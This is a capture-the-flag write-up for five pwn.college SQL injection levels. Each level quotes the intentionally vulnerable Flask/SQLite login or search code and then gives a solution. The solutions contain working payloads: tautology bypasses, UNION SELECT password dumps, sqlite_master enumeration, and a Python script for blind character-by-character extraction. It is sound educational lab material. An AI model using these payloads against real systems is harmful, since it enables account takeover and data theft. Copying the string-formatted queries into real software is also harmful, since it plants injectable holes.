---
tags: ["Web Security", "SQL"]
title: "SQL Injection"
description: SQL Injection
reference: https://pwn.college/intro-to-cybersecurity/web-security/
---

# 1

## Description

Of course, these sorts of security gaps abound! For example, in this level, the specification of the logged in user is actually secure. Instead of get parameters or raw cookies, this level uses an encrypted session cookie that you will not be able to mess with. Thus, your task is to get the application to actually authenticate you as admin!

Luckily, as the name of the level suggests, this application is vulnerable to a SQL injection. A SQL injection, conceptually, is to SQL what a Command Injection is to the shell. In Command Injections, the application assembled a command string, and a gap between the developer's intent and the command shell's actual functionality enabled attackers to carry out actions unintended by the attacker. A SQL injection is the same: the developer builds the application to make SQL queries for certain goals, but because of the way these queries are assembled by the application logic, the resulting actions of the SQL query, when executed by the database, can be disastrous from a security perspective.

Command injections don't have a clear solution: the shell is an ancient piece of technology, and the interfaces to the shell have ossified decades ago and are very hard to change. SQL is somewhat more nimble, and most databases now provide interfaces that are very resistant to being SQL-injectible. In fact, the authentication bypass levels used such interfaces: they are very vulnerable, but not to SQL injection.

This level, on the other hand, is SQL injectible, as it purposefully uses a slightly different way to make SQL queries. When you find the SQL query into which you can inject your input (hint: it is the only SQL query to substantially differ between this level and the previous level), look at what the query looks like right now, and what unintended conditions you might inject. The quintessential SQL injection adds a condition so that an application can succeed without knowing the password. How can you accomplish this?

## Solution

1. user login logic:

```python
@app.route("/account", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("userid")
    pin = flask.request.form.get("pin")
    if not username:
        flask.abort(400, "Missing `userid` form parameter")
    if not pin:
        flask.abort(400, "Missing `pin` form parameter")

    if pin[0] not in "0123456789":
        flask.abort(400, "Invalid pin")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }"
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or pin")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)
```

2. attack point

It only check the first character of the `pin`:

```
    if pin[0] not in "0123456789":
        flask.abort(400, "Invalid pin")
```

3. set `pin` to `0 OR 1=1` and `username` to `admin`

so the query will become

```
SELECT rowid, * FROM users WHERE username = 'admin' AND pin = 0 OR 1=1 
```

---

# 2

## Description

The previous level's SQL injection was quite simple to pull off and still have a valid SQL query. This was, in part, because your injection happened at the very end of the query. In this level, however, your injection happens partway through, and there is (a bit) more of the SQL query afterwards. This complicates matters, because the query must remain valid despite your injection.

## Solution

1. read the authentication logic

```python
@app.route("/authenticate", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("identity")
    password = flask.request.form.get("pass")
    if not username:
        flask.abort(400, "Missing `identity` form parameter")
    if not password:
        flask.abort(400, "Missing `pass` form parameter")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)


@app.route("/authenticate", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return (
        page
        + """
        <hr>
        <form method=post>
        User:<input type=text name=identity>Password:<input type=text name=pass><input type=submit value=Submit>
        </form>
        </body></html>
    """
    )
```

2. 

set password = 

```
0' OR '1=1
```

so the query will become

```
SELECT rowid, * FROM users WHERE username = 'admin' AND password = '0' OR '1=1'
```

then the `OR` will not be treated as part of the `password`. It will be processed as a conditional keyword.

---

# 3

## Description

If you recall, your command injection exploits typically caused additional commands to be executed. So far, your SQL injections have simply modified the conditions of existing SQL queries. However, similar to how the shell has ways to chain commands (e.g., ;, |, etc), some SQL queries can be chained as well!

An attacker's ability to chain SQL queries has extremely powerful potential. For example, it allows the attacker to query completely unintended tables or completely unintended fields in tables, and leads to the types of massive data disclosures that you read about on the news.

This level will require you to figure out how to chain SQL queries in order to leak data. Good luck!

## Solution

1. read the server code

```python
@app.route("/", methods=["GET"])
def challenge():
    query = flask.request.args.get("query", "%")

    try:

        # https://www.sqlite.org/lang_select.html
        sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
        print(f"DEBUG: {query=}")
        results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
    except sqlite3.Error as e:
        results = f"SQL error: {e}"

    return f"""
        <html><body>Welcome to the user query service!
        <form>Query:<input type=text name=query value='{query}'><input type=submit value=Submit></form>
        <hr>
        <b>Query:</b> <pre>{ sql }</pre><br>
        <b>Results:</b><pre>{results}</pre>
        </body></html>
        """
```

2. set query

input:

```
%' UNION SELECT password FROM users --
```

server will construct this query:

```
SELECT username FROM users WHERE username LIKE "%" UNION SELECT password as username FROM users --"
```

idea behind:

- the server only get the username column from the user table
- we can treat the other columns of the user table as username column and union the rows of the column with the same name `username`

---

# 4

## Description

So far, the database structure has been known to you (e.g., the name of the users table), allowing you to knowingly craft your queries. As a developer, you might be tempted to prevent this by, say, randomizing your table names, so that an attacker can't specify them to query data that they are not supposed to. Unfortunately, this is not the slam dunk that you might think it is.

Databases are complex and much too clever for their own good. For example, almost all modern databases keep the database layout specification itself in a table. Attackers can query this table to get the table names, field names, and whatever other information they might need!

In this level, the developers have randomized the name of the (previously known as) users table. Find it, and find the flag!

## Solution

1. read the server code

```python
@app.route("/", methods=["GET"])
def challenge():
    query = flask.request.args.get("query", "%")

    try:
        # https://www.sqlite.org/schematab.html
        # https://www.sqlite.org/lang_select.html
        sql = f'SELECT username FROM {random_user_table} WHERE username LIKE "{query}"'
        print(f"DEBUG: {query=}")
        results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
    except sqlite3.Error as e:
        results = f"SQL error: {e}"

    return f"""
        <html><body>Welcome to the user query service!
        <form>Query:<input type=text name=query value='{query}'><input type=submit value=Submit></form>
        <hr>
        <b>Query:</b> <pre>{ sql.replace(random_user_table, "REDACTED") }</pre><br>
        <b>Results:</b><pre>{results}</pre>
        </body></html>
        """
```

2. get the table names in the database

input:

```
%" UNION SELECT name as username FROM sqlite_master WHERE type =
```

result:

```
admin
guest
users_8508342390
```

3. get password from `users_8508342390` table

input:

```
%" UNION SELECT password as username FROM users_8508342390 --
```


---

# 5

## Description

SQL injection happen in all sorts of places in an application and, like command injections, sometimes the result of the query is not sent back to you. With command injections, this case is easier: the commandline is so powerful that you can do a lot of things even blindly. With SQL injections, this is sometimes not the case. For example, unlike some other databases, the SQLite database used in this module cannot access the filesystem, execute commands, and so on.

So, if the application does not show you the data resulting from your SQL injection, how do you actually leak the data? Sometimes, even if the actual data is not shown, you can recover one bit! If the result of a query can make the application act two different ways (say, redirecting to an "Authentication Success" page versus an "Authentication Failure" page), then an attacker can carefully craft yes/no questions that they can get answers to.

This challenge gives you exactly this scenario. Can you leak the flag?

## Solution

1. read the server code

```python
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, 'password' as password""")


@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)


@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"

    return (
        page
        + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Password:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """
    )
```

2. guess password query character by character

username:

```
admin
```

password:

```
1' OR password LIKE 'p%
```

The server redirected the client to the `/` page which indicate the login was succeed:

```
DEBUG: query="SELECT rowid, * FROM users WHERE username = 'admin' AND password = '1' OR password LIKE 'p%'"
127.0.0.1 - - [22/Jul/2025 08:22:03] "POST / HTTP/1.1" 302 -
```

3. write a python script to guess the password

key sql function: `substr`.

> the `LIKE` function does not work because it is not case-sensitive

```python
import requests
import string


# URL of the login endpoint
url = "http://challenge.localhost"

pw = ""

i = 1

# Form data payload
payload = {
    "username": "admin",
}

printable = string.printable

while True:
    for c in printable:
        if c == "%" or c == "_" or c == '\n':
            continue
        payload["password"] = f"1' OR SUBSTR(password,{i}, 1) = '{c}"

        # Send the POST request
        response = requests.post(url, data=payload)

        if response.status_code == 200:
            pw += c
            i += 1
            print(pw)
            break
```
